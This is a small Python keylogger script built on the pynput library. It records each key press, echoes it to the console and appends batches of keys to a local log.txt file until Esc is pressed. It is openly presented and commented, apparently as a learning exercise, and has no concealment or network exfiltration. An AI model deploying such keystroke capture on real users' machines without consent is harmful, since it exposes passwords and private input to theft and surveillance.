#the pynput library must be installed to run this program
import pynput
from pynput.keyboard import Key, Listener

#counter is used to store keys in chunks. Optimization.
counter = 0
#array to hold keys prior to file.
keys_logged = []

#function key_start adds the recently pressed key to our key_logged list.
#once we hit 5 keys it writes it to the file.
def key_start(key):
    global keys_logged, counter

    keys_logged.append(key)
    counter += 1
    print("{0}".format(key))

    if counter >= 5:
        counter = 0
        write_file(keys_logged)
        keys_logged = []

#function for when key is let go of
def key_end(key):
    if key == Key.esc:
        return False

#function writes keys to file. New line for every space. Replaces default 'x' with x.
#assumes log.txt has already been created.
def write_file(keys_logged):
    with open("log.txt", "a") as f:
        for key in keys_logged:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

#listen to our key events
with Listener(on_press=key_start, on_release=key_end) as listener:
    listener.join()
